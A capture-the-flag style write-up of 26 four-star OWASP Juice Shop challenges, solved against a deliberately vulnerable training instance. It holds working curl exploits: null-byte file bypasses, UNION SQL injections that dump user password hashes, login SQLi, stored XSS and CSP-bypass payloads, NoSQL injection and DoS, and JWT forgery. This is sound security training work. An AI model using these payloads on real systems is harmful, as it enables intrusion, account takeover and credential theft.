# 4-Star Challenges (26)

Writeups for the twenty-six **★★★★** challenges (findings 54–78 in `JUICE.md`).
Numbering below is 1–26. Mapping to the findings list and to the
"★★★★ (26):" register line: 1–4 → 54–57 · 5–6 → 58 (Easter Egg / Nested Easter
Egg) · 7–16 → 59–68 · 17–20 → 69–72 · 21–24 → 73–76 · 25–26 → 77–78.
***(team activity)*** entries were solved on the shared team instance and are
described at register level; the rest were performed and verified directly.

**Prerequisites** — Juice Shop **v20.2.0** behind the MultiJuicer proxy: every
request needs the `multi-juicer` session cookie, else the proxy `302`s to
`/multi-juicer`. Most `/rest`+`/api` routes use `Authorization: Bearer <jwt>`;
`/profile`, `/rest/user/whoami`, `/rest/image-captcha`,
`/rest/user/data-export` read the JWT from the `token` cookie / in-memory
store. `$BASE` = `https://<proxy-host>/` (cookie attached); `$TOKEN` = bearer
JWT from `POST /rest/user/login`. Payloads with embedded quotes are best sent
as body files (`-d @body.json`). See `../environment-setup.md` and
`../authentication-model.md`.

---

## 1. Poison Null Byte
Difficulty: ★★★★ | Vulnerability class: CWE-158 (Improper Null Termination) / CWE-434 (unrestricted file download)
- Attack surface: `GET /ftp/:file` (extension allowlist)
- Root cause: The FTP handler validates the request file name *before* any null
  byte is processed — `file.endsWith('.md')` or `'.pdf'` passes the check — and
  only afterwards truncates at `%00` (`security.cutOffPoisonNullByte`). Because
  the route parameter is URI-decoded only once, a **double-encoded** `%2500`
  survives the check as a literal `%00` and is cut off before the file is
  served, so the allowlist never sees the real extension.
- Exploit: pick any non-allowed file listed in `/ftp` and append `%2500.md`:
  ```bash
  curl -k -s "$BASE/ftp/eastere.gg%2500.md"
  curl -k -s "$BASE/ftp/package.json.bak%2500.md"
  curl -k -s "$BASE/ftp/coupons_2013.md.bak%2500.md"
  curl -k -s "$BASE/ftp/suspicious_errors.yml%2500.md"
  ```
- Verification: server returns the blocked file's body instead of
  `403 Only .md and .pdf files are allowed!`; the challenge flips to solved on
  the response (the same trick auto-solves the sibling file challenges 2, 3, 5
  and 7). A direct solve is also triggered by retrieving `encrypt.pyc`.

## 2. Misplaced Signature File
Difficulty: ★★★★ | Vulnerability class: CWE-538 (insertion of sensitive data into publicly-accessible area)
- Attack surface: `GET /ftp/suspicious_errors.yml%2500.md`
- Root cause: A SIEM/Sigma **detection-signature file**
  (`suspicious_errors.yml`, `author: Bjoern Kimminich`) that was meant for
  operational use only was left inside the web-accessible `/ftp` tree; the
  only thing standing between it and the public is the extension allowlist.
- Exploit: reuse the poison-null-byte bypass from challenge 1:
  ```bash
  curl -k -s "$BASE/ftp/suspicious_errors.yml%2500.md"
  ```
  The YAML holds the shop's internal detection rules (e.g. `Blocked illegal activity`, `Only * files are allowed`).
- Verification: `200` with the Sigma YAML body and the challenge marked solved.

## 3. Forgotten Developer Backup
Difficulty: ★★★★ | Vulnerability class: CWE-530 (exposure of backup files)
- Attack surface: `GET /ftp/package.json.bak%2500.md`
- Root cause: A developer's backup of the application manifest
  (`package.json.bak`, header version `6.2.0-SNAPSHOT`) was committed to the
  `ftp/` folder and is exposed by the same weak extension check as challenge 1.
  It leaks the full dependency tree and pinned versions — the reconnaissance
  source for challenges 12, 15 and 19.
- Exploit:
  ```bash
  curl -k -s "$BASE/ftp/package.json.bak%2500.md"
  ```
- Verification: `200` with the JSON manifest (note `"express-jwt": "0.1.3"`,
  `"epilogue-js": "~0.7"`); the challenge solves on retrieval.

## 4. Access Log
Difficulty: ★★★★ | Vulnerability class: CWE-532 (sensitive info written to an exposed log file)
- Attack surface: `GET /support/logs` (auto-index) and `GET /support/logs/:file`
- Root cause: The Express request-log stream is written to the `logs/`
  directory and a developer left that whole directory browsable and
  downloadable via `/support/logs`, which maps straight onto `logs/:file`
  (`routes/logfileServer.ts`) — no authentication.
- Exploit:
  ```bash
  curl -k -s "$BASE/support/logs"          # directory listing
  curl -k -s "$BASE/support/logs/access.log.$(date +%F)"
  ```
  The daily `access.log.<YYYY-MM-DD>` file carries full `morgan 'combined'`
  output — the same logs that later leak the 5★ `J12934@juice-sh.op` password.
- Verification: `200` with raw combined-format log lines; challenge solved on
  the first successful log download.

## 5. Easter Egg
Difficulty: ★★★★ | Vulnerability class: CWE-200 (hidden content in publicly-served directory)
- Attack surface: `GET /ftp/eastere.gg%2500.md`
- Root cause: The developers' "real" easter egg file `eastere.gg` sits in the
  browsable `/ftp` folder alongside the other backup files and is protected
  only by the same extension allowlist.
- Exploit:
  ```bash
  curl -k -s "$BASE/ftp/eastere.gg%2500.md"
  ```
  The file greets the finder and then points at a single Base64 blob which
  leads to challenge 6.
- Verification: challenge solves on retrieval of `eastere.gg` (the file-access
  verifier watches for exactly this file name).

## 6. Nested Easter Egg
Difficulty: ★★★★ | Vulnerability class: CWE-200 (hidden route reachable by cryptanalysis)
- Attack surface: the route hidden inside `eastere.gg` (served by
  `routes/easterEgg.ts`)
- Root cause: The "egg inside the egg" is protected only by **obfuscation**:
  the hint in `eastere.gg` is double-encoded (Base64 → ROT13) and must be
  decoded to reveal a URL path the developers thought no one would find.
- Exploit: peel the layers off the blob from challenge 5:
  ```bash
  echo '<blob from eastere.gg>' | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # base64 -> ROT13
  ```
  This reveals the hidden dev route; `GET` it:
  ```bash
  curl -k -s "$BASE/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg"
  ```
- Verification: `200` with the private `threejs-demo.html` asset and the
  challenge solved as soon as the route is hit.

## 7. Forgotten Sales Backup
Difficulty: ★★★★ | Vulnerability class: CWE-530 (exposure of backup files)
- Attack surface: `GET /ftp/coupons_2013.md.bak%2500.md`
- Root cause: A sales representative's backup of historical (2013) campaign
  coupon codes was left in the `ftp/` folder, readable via the null-byte
  bypass — background for the 2013 coupon campaigns (challenges 22, 24).
- Exploit:
  ```bash
  curl -k -s "$BASE/ftp/coupons_2013.md.bak%2500.md"
  ```
- Verification: `200` with the coupon list (e.g. codes like `n<MibgC7sn`);
  challenge solves on retrieval.

## 8. Christmas Special
Difficulty: ★★★★ | Vulnerability class: CWE-89 (SQL injection) + CWE-841 (business-logic abuse of soft-deleted records)
- Attack surface: `GET /rest/products/search?q=` (SQLi), `POST /api/BasketItems/`, checkout
- Root cause: The 2014 "Christmas Super-Surprise-Box" still exists in the
  `Products` table but was **soft-deleted** (`deletedAt` set). The search query
  appends `AND deletedAt IS NULL`, so it never appears in the shop — but the
  basket API will happily reference its id anyway.
- Exploit:
  1. Find the deleted product's row and id with a 9-column UNION on the search
     endpoint that ignores the `deletedAt` filter:
     ```bash
     curl -k -sG "$BASE/rest/products/search" \
       --data-urlencode "q=x')) UNION SELECT id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt FROM Products WHERE deletedAt IS NOT NULL--"
     ```
     The deleted row reads `Christmas Super-Surprise-Box (2014 Edition)`.
  2. Add it to your own basket directly via the API (the frontend refuses
     out-of-stock items, the API does not):
     ```bash
     curl -k -s -X POST "$BASE/api/BasketItems/" -H "Authorization: Bearer $TOKEN" \
       -H 'Content-Type: application/json' \
       -d '{"ProductId": <christmas-id>, "BasketId": <your-basket>, "quantity": 1}'
     ```
  3. Check the basket out (`POST /rest/basket/:id/checkout`).
- Verification: order placement iterates the basket items and solves the
  challenge as soon as one item is the Christmas-special product id; the
  receipt PDF likewise shows the product line.

## 9. Ephemeral Accountant
Difficulty: ★★★★ | Vulnerability class: CWE-89 (SQL injection in authentication query)
- Attack surface: `POST /rest/user/login` (`email` field)
- Root cause: The login query interpolates `req.body.email` into a raw SQL
  `SELECT ... FROM Users WHERE email = '...' AND password = '...'`. The
  accountant `acc0unt4nt@juice-sh.op` does **not** exist in the database (it
  is deliberately auto-created and auto-deleted, and registration with that
  address is blocked), so the only way to authenticate as him is to *synthesize
  the row out of thin air* with a UNION, which never touches the `Users` table.
- Exploit: log in with a UNION payload that fabricates a full `Users` row
  (`role` = `accounting`); the trailing `--` neutralizes the password check, so
  the password value is arbitrary:
  ```bash
  curl -k -s -X POST "$BASE/rest/user/login" -H 'Content-Type: application/json' -d '{
    "email": "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp', '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--",
    "password": "whatever"
  }'
  ```
  Do **not** register `acc0unt4nt@juice-sh.op` first — the verifier only solves
  when the real `Users` table contains zero rows for that email.
- Verification: login succeeds and returns a token; the challenge verifier
  confirms `role === 'accounting'` with `count === 0` in the users table.

## 10. Steganography
Difficulty: ★★★★ | Vulnerability class: CWE-200 (content hidden in plain sight via steganography)
- Attack surface: shop images (asset images in `/assets/public/images/…`) + `POST /api/Feedbacks/`
- Root cause: A well-known character is hidden **inside one of the shop's
  images** using steganography. It is invisible to the naked eye and needs
  dedicated tooling to extract; the shop "rats out" the culprit once the exact
  character name is reported via the feedback form.
- Exploit:
  1. Mirror the shop's images and run stego analysis on each (e.g.
     `steghide`/`zsteg`, LSB/colour-plane checks) until the hidden character
     is revealed behind the support-team photo.
  2. Report the character's exact name in a feedback comment so the
     "inform-the-shop" verifier matches it:
     ```bash
     curl -k -s -X POST "$BASE/api/Feedbacks/" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"rating": 5, "comment": "<character is hiding behind the support team>", "captchaId": <id>, "captcha": <answer>}'
     ```
     captcha id/answer come from `GET /rest/captcha/`.
- Verification: challenge solves on the next verification pass when the
  feedback comment contains the character name (`pickle rick`).

## 11. HTTP-Header XSS
Difficulty: ★★★★ | Vulnerability class: CWE-79 (stored XSS via unvalidated HTTP header)
- Attack surface: `GET /rest/saveLoginIp` with the proprietary `True-Client-IP` header
- Root cause: After each login the SPA calls `/rest/saveLoginIp`, which trusts
  the **`True-Client-IP`** request header as the user's last-login IP and
  stores it **unsanitized** into `lastLoginIp` — a header the application
  itself never sets. That value is later rendered into the administration view
  of the users table.
- Exploit: fire the endpoint yourself with the XSS payload in the header
  (requires a valid bearer token so the route can resolve the logged-in user):
  ```bash
  curl -k -s -X GET "$BASE/rest/saveLoginIp" -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -H 'True-Client-IP: <iframe src="javascript:alert(`xss`)">'
  ```
- Verification: the response JSON shows the stored `lastLoginIp` equal to the
  payload and the challenge solves (`lastLoginIp === '<iframe
  src="javascript:alert(`xss`)"'`); the payload then fires when an admin views
  the affected user row.

## 12. Vulnerable Library
Difficulty: ★★★★ | Vulnerability class: CWE-1104 (use of an unmaintained / known-vulnerable third-party component)
- Attack surface: `POST /api/Feedbacks/` (or `/api/Complaints/`) — "inform the shop"
- Root cause: The developer backup (challenge 3) reveals the app once pinned
  `express-jwt` to **0.1.3** (and `sanitize-html` to **1.4.2**) — versions
  with known high-severity vulnerabilities. The verifier scans submitted
  feedback for a library name **and** version.
- Exploit: report the vulnerable dependency naturally (anti-cheat compares
  against source files, so phrase it like a human finding, not a code dump):
  ```bash
  curl -k -s -X POST "$BASE/api/Feedbacks/" -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"rating": 5, "comment": "The express-jwt 0.1.3 dependency has a known high-severity vulnerability", "captchaId": <id>, "captcha": <answer>}'
  ```
- Verification: challenge solves when feedback/ complaint mentions
  `express-jwt` + `0.1.3` (equivalently `sanitize-html` + `1.4.2`).

## 13. NoSQL Manipulation
Difficulty: ★★★★ | Vulnerability class: CWE-943 (NoSQL injection via query operators)
- Attack surface: `PATCH /rest/products/reviews` (update review)
- Root cause: The review-update handler forwards the caller-supplied `id`
  straight into the Mongo/MarsDB update selector —
  `update({ _id: req.body.id }, { $set: { message } }, { multi: true })` — with
  no type check. Passing a **query-operator object** instead of a scalar `_id`
  makes the selector match many documents at once, and `multi: true` rewrites
  them all.
- Exploit:
  ```bash
  curl -k -s -X PATCH "$BASE/rest/products/reviews" -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"id": {"$gt": 0}, "message": "updated in bulk"}'
  ```
  `{ _id: { $gt: 0 } }` matches essentially every review document.
- Verification: the JSON response reports `"modified": <n>` with `n > 1`
  (challenge check: `result.modified > 1`).

## 14. Login Bjoern (OAuth)
Difficulty: ★★★★ | Vulnerability class: CWE-798 (derivable/hard-coded credential in the OAuth flow)
- Attack surface: `POST /rest/user/login` (pre-login credential check)
- Root cause: The shop's Google OAuth integration derives the account password
  **deterministically from the email** as `base64(reversed_email)`, so any Gmail
  address's "OAuth password" is computable — no reset, SQLi or Google
  compromise needed. It is verified as a pre-login check on the login endpoint.
- Exploit:
  ```bash
  python3 -c "import base64; print(base64.b64encode('moc.liamg@hcinimmik.nreojb'.encode()).decode())"
  # bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
  curl -k -s -X POST "$BASE/rest/user/login" -H 'Content-Type: application/json' \
    -d '{"email": "bjoern.kimminich@gmail.com", "password": "bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI="}'
  ```
- Verification: login returns `200` with a valid token for Bjoern's Gmail
  account and the challenge is solved by the pre-login check
  (email + derived password match exactly).

## 15. Server-side XSS Protection
Difficulty: ★★★★ | Vulnerability class: CWE-79 (stored XSS) + CWE-116 (improper output encoding / non-recursive sanitizer)
- Attack surface: `POST /api/Feedbacks/` (comment field)
- Root cause: Feedback comments pass through `sanitize-html` **1.4.2**
  (challenge 12) in a **single, non-recursive** pass. The sanitizer removes the
  *masking* `<script>` block but leaves the rest of the line intact, so the
  survivors reassemble into the exact attack tag.
- Exploit: post feedback whose comment wraps the payload in a disposable
  `<script>` so the sanitizer eats only the mask:
  ```bash
  curl -k -s -X POST "$BASE/api/Feedbacks/" -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"rating": 5, "comment": "<<script>Foo</script>iframe src=\"javascript:alert(`xss`)\">", "captchaId": <id>, "captcha": <answer>}'
  ```
  Sanitized result: `<iframe src="javascript:alert(\`xss\`)">`. The alert fires
  wherever feedback is rendered (e.g. the about/administration screens).
- Verification: `GET /api/Feedbacks` shows the persisted comment reassembled
  into the iframe payload; challenge solves at write time because the model
  setter checks the sanitized output.

## 16. Allowlist Bypass
Difficulty: ★★★★ | Vulnerability class: CWE-601 (open redirect past an allowlist)
- Attack surface: `GET /redirect?to=...`
- Root cause: The redirect guard allows any URL that **contains** an
  allowlisted string (`url.includes(allowedUrl)`) while the "unintended
  redirect" check uses `startsWith` — so a relative URL that embeds an
  allowlisted string as a query parameter passes the allowlist yet does not
  start with any allowed URL, and the server redirects off-allowlist.
- Exploit:
  ```bash
  curl -k -sI "$BASE/redirect?to=/score-board?satisfyIndexOf=https://github.com/juice-shop/juice-shop"
  ```
  The `to` value contains the allowlisted GitHub URL (passes `includes`) but
  resolves to the local SPA route (fails `startsWith` for every allowed URL).
- Verification: `HTTP/1.1 302 Location: /score-board?satisfyIndexOf=...`
  follows through to the app and the challenge flips to solved.

## 17. Reset Bender's Password
Difficulty: ★★★★ | Vulnerability class: CWE-640 (weak password recovery) + OSINT
- Attack surface: `POST /rest/user/reset-password`
- Root cause: Security-question answers are verified against
  `HMAC-SHA256(answer, 'pa4qacea4VK9t9nGv7yZtwmj')` and Bender answered his
  question **truthfully**. The correct answer is publicly knowable from the
  character's canon.
- Exploit:
  ```bash
  curl -k -s -X POST "$BASE/rest/user/reset-password" -H 'Content-Type: application/json' \
    -d '{"email": "bender@juice-sh.op", "answer": "Stop'\''n'\''Drop", "new": "<new-password>", "repeat": "<new-password>"}'
  ```
- Verification: `200` with the updated user object; the verifier checks
  `user.id === bender.id && answer === "Stop'n'Drop"`.

## 18. Reset Uvogin's Password
Difficulty: ★★★★ | Vulnerability class: CWE-640 (weak password recovery) + OSINT
- Attack surface: `POST /rest/user/reset-password`
- Root cause: Same HMAC-gated reset flow as challenge 17; Uvogin's answer was
  recovered by OSINT on the character's public persona/aliases.
- Exploit:
  ```bash
  curl -k -s -X POST "$BASE/rest/user/reset-password" -H 'Content-Type: application/json' \
    -d '{"email": "uvogin@juice-sh.op", "answer": "Silence of the Lambs", "new": "<new-password>", "repeat": "<new-password>"}'
  ```
- Verification: `200`; verifier requires `user.id === uvogin.id && answer ===
  "Silence of the Lambs"`.

## 19. Legacy Typosquatting
Difficulty: ★★★★ | Vulnerability class: CWE-1104 / supply-chain typosquatting (CWE-1357)
- Attack surface: `POST /api/Feedbacks/` (or `/api/Complaints/`) — "inform the shop"
- Root cause: The developer backup (challenge 3) lists the dependency
  `"epilogue-js": "~0.7"`. The legitimate npm package is **`epilogue`** —
  `epilogue-js` is a typosquatted fork the app has been pulling in since at
  least `v6.2.0-SNAPSHOT`.
- Exploit: report the exact culprit name through the feedback form:
  ```bash
  curl -k -s -X POST "$BASE/api/Feedbacks/" -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d '{"rating": 5, "comment": "The app depends on the typosquatted npm package epilogue-js", "captchaId": <id>, "captcha": <answer>}'
  ```
- Verification: challenge solves when feedback/ complaint contains the string
  `epilogue-js`.

## 20. User Credentials (UNION SQLi)
Difficulty: ★★★★ | Vulnerability class: CWE-89 (UNION-based SQL injection)
- Attack surface: `GET /rest/products/search?q=` (SQLite, 9-column result set)
- Root cause: The product search interpolates `q` into a raw SQL `LIKE`
  query. A UNION over the `Users` table returns all account credentials
  (emails + MD5 password hashes) inside the product result set.
- Exploit: close the search predicate and union the whole user table:
  ```bash
  curl -k -sG "$BASE/rest/products/search" \
    --data-urlencode "q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
  ```
  Every seed user's row (e.g. `admin@juice-sh.op` /
  `0192023a7bbd73250516f069df18b500`) appears in the JSON response.
- Verification: the challenge only solves when the response contains **all**
  current users' emails *and* password hashes (checked against `Users.findAll`
  server-side), so re-run the dump after any new account is registered if the
  challenge has not flipped yet.

## 21. GDPR Data Theft  *(team activity)*
Difficulty: ★★★★ | Vulnerability class: CWE-639 (data-theft via identifier collision in data export)
- Attack surface: `POST /rest/user/data-export`
- Root cause: The GDPR export looks orders up by the **vowel-masked** email
  (`email.replace(/[aeiou]/gi,'*')`) instead of by account. Any account whose
  masked email collides with a victim's inherits their order history — and the
  verifier flags an order whose `orderId` prefix does not match the caller's
  own email hash.
- Exploit (high level): register a colliding account and export *its* data. The
  documented collision pair is:
  ```
  admin@juice-sh.op -> *dm*n@j**c*-sh.*p
  edmen@jaace-sh.ep -> *dm*n@j**c*-sh.*p   <- register this
  ```
  The export is gated by an image CAPTCHA whose plaintext answer is readable
  via the search SQLi (reads the `ImageCaptchas` table):
  ```
  q=x')) UNION SELECT id,answer,image,4,5,6,7,8,9 FROM ImageCaptchas ORDER BY id DESC--
  ```
- Verification: the returned `userData` contains orders whose orderId prefix
  differs from the attacker's own email hash (admin's order data leaked);
  challenge solves from that foreign order row.

## 22. Leaked Unsafe Product  *(team activity)*
Difficulty: ★★★★ | Vulnerability class: CWE-538 / OSINT data leak (DLP)
- Attack surface: `POST /api/Complaints/` — "inform the shop"
- Root cause: An unsafe product that was removed from the catalogue had its
  data (including its dangerous ingredients) leaked to a public paste
  platform. The deleted row is recoverable via the search SQLi and cross
  references the paste.
- Exploit (high level): via the UNION SQLi, list soft-deleted products
  (`deletedAt IS NOT NULL`) and identify the product whose description flags it
  as removed "because of lack of safety standards"; hunt the leaked
  ingredient names on the same paste platform used for other leaked data; then
  inform the shop with a complaint naming the dangerous ingredients.
- Verification: the complaint message matching the documented ingredient
  keywords flips the challenge on the next verification pass.

## 23. Login Cloud Admin  *(team activity)*
Difficulty: ★★★★ | Vulnerability class: CWE-798 (hard-coded cryptographic key) + CWE-287 (authentication bypass)
- Attack surface: `/infrastructure/*` IaC files + authenticated routes (Bearer JWT)
- Root cause: Sensitive IaC material (Terraform) was deployed into the
  web-served `/infrastructure` folder and leaks the RSA key material needed to
  mint JWTs. The cloud-admin account (`cloud-admin@juice-sh.op`, role `admin`)
  never needs its strong password — an attacker who can sign tokens reaches it.
- Exploit (high level): download the IaC file from `/infrastructure`, extract
  the leaked RSA private key, and sign an **RS256** JWT whose payload claims
  `email: cloud-admin@...` (+ admin role); send it as `Authorization: Bearer`
  on any authenticated request. Signing must be RS256 — the verifier checks
  the algorithm and the `/cloud-admin@/` email pattern in the token.
- Verification: the `jwtChallenge` verifier accepts the forged token on a
  normal request and the challenge solves (no password needed).

## 24. Expired Coupon  *(team activity)*
Difficulty: ★★★★ | Vulnerability class: CWE-841 (business-logic / time-validation flaw)
- Attack surface: basket checkout coupon handling (`POST /rest/basket/:id/checkout` with `couponData`)
- Root cause: The checkout accepts an optional `couponData` blob (Base64 of
  `code-<timestamp>`) and validates it by *comparing the embedded timestamp
  against a campaign's fixed date with loose equality* — it never rejects
  campaigns whose date has already passed. A coupon whose embedded timestamp
  references an **expired/past campaign** is therefore still honoured, and the
  challenge marks the redemption as abuse.
- Exploit (high level): identify a past special-event/holiday campaign of the
  shop (background in the historical coupon backup from challenge 7), then
  submit its code with the matching old timestamp as `couponData` during
  checkout so the discount applies.
- Verification: checkout succeeds with the expired campaign discount applied;
  the verifier confirms the campaign's `validOn` is in the past of the server
  clock and solves the challenge.

## 25. NoSQL DoS
Difficulty: ★★★★ | Vulnerability class: CWE-943 (NoSQL injection → denial of service)
- Attack surface: `GET /rest/products/:id/reviews` (Mongo `$where` injection)
- Root cause: With the challenge enabled, the review endpoint interpolates the
  product `id` directly into `{ $where: 'this.product == ' + id }` and exposes
  a global `sleep()` helper. `$where` is evaluated **once per document**, so a
  single `sleep()` call multiplies across the whole reviews collection —
  `sleep(2000)` stalls the request and gets the pod killed (this caused one
  instance restart).
- Exploit: calibrate instead — a small per-document sleep that clears the
  2000 ms solve threshold without hanging the pod:
  ```bash
  time curl -k -s "$BASE/rest/products/sleep(80)/reviews"
  ```
  Each review document sleeps 80 ms; with ~40 reviews the request totals ~3 s —
  over the 2 s solve threshold — and the instance stays up. (`sleep` clamps
  each call at 2000 ms, so large values merely make the total worse, not the
  flag better.)
- Verification: response takes `> 2000 ms` end-to-end (the route measures
  `t1 - t0` around the query) and the challenge solves without the instance
  restarting.

## 26. CSP Bypass  *(team activity)*
Difficulty: ★★★★ | Vulnerability class: CWE-79 (XSS) + CWE-693 (CSP injection) + CWE-116 (regex sanitizer bypass)
- Attack surface: `/profile/image/url` (profileImage), `POST /profile` (username), `GET /profile` (legacy Pug page)
- Root cause: Two flaws collide on the legacy profile page. (1) The page's CSP
  is built by string interpolation — `` `img-src 'self' ${profileImage};
  script-src 'self'` `` — so a crafted `profileImage` **injects a second,
  permissive `script-src`**. (2) The username field is scrubbed by the
  deliberately weak `sanitizeLegacy` regex `/<(?:\w+)\W+?[\w]/gi`, which can be
  defeated by a self-reassembling payload.
- Exploit (high level):
  1. Set the profile image URL so it survives as the raw URL *and* extends the
     CSP with an unsafe inline allowance:
     ```
     https://placehold.co/100.png; script-src 'unsafe-inline'
     ```
     (`POST /profile/image/url` stores the raw value when the fetch fails; the
     injected header matches `/;[ ]*script-src(.)*'unsafe-inline'/`.)
  2. Set the username to a payload whose removed span reassembles into the
     exact attack string after `sanitizeLegacy` runs:
     ```
     <<a>sscript>alert(`xss`)</script>
     ```
     Survivors recombine to `<script>alert(\`xss\`)</script>`.
  3. `GET /profile`: the page is served under the weakened CSP and executes
     the script.
- Verification: request response carries
  `Content-Security-Policy: img-src 'self' https://placehold.co/100.png;
  script-src 'unsafe-inline'; script-src 'self' 'unsafe-eval'`; the username
  check (`username.includes('<script>alert(\`xss\`)</script>')`) plus the CSP
  regex both pass, and the alert fires in the legacy profile view.
